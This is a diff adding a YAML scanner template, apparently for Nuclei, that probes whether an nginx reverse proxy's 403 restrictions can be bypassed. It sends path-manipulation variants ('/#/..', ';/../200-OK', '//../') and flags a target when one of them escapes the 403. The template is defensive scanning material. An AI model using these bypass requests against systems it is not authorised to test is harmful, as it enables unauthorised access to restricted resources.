@@ -1,0 +1,47 @@
+id: nginx-reverse-proxy-4xx-bypass
+
+info:
+  name: nginx-reverse-proxy-4xx-bypass
+  author: aufzayed
+  severity: info
+  description: nginx reverse proxy 4xx bypass
+  tags: fuzz
+
+requests:
+  - raw:
+    - |+
+      GET {{Path}} HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+
+    - |+
+      GET /#/..{{Path}} HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+    
+    - |+
+      GET {{Path}};/../200-OK HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+
+    - |+
+      GET {{Path}}//../ HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+      Referer: {{BaseURL}}
+      Origin: {{RootURL}}
+
+    unsafe: true
+    redirects: true
+    req-condition: true
+    threads: 10
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code_1 == 403 && status_code_2 != 403"
+          - "status_code_1 == 403 && status_code_3 != 403"
+          - "status_code_1 == 403 && status_code_4 != 403"
